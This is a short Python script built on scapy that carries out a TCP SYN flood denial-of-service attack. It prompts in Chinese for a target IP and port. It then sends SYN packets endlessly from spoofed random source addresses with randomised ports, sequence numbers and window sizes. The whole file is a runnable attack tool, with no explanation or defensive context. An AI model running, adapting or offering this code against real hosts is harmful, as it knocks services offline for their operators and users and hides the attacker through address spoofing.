from scapy.all import *
from random import randint

def random_ip():
    ip = str(randint(0,255))+'.'+str(randint(0,255))+'.'+str(randint(0,255))+'.'+str(randint(0,255))
    return ip

def rand_number():
	x = randint(1000,9000)
	return x

def SYN_Flood(d_ip,d_port):
    input('案任意鍵開始TCP SYN flood攻擊 按下CTRL+C終止攻擊')
    while True:
        s_port = rand_number()
        s_eq = rand_number()
        w_indow = rand_number()

        IP_Packet = IP()
        IP_Packet.src = random_ip()
        IP_Packet.dst = d_ip

        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = int(d_port)
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        send(IP_Packet/TCP_Packet, verbose=0)


def main():
	d_ip = input("請輸入IP\n")
	d_port = input("請輸入port number\n")
	SYN_Flood(d_ip,d_port)
if __name__ == '__main__':
    main()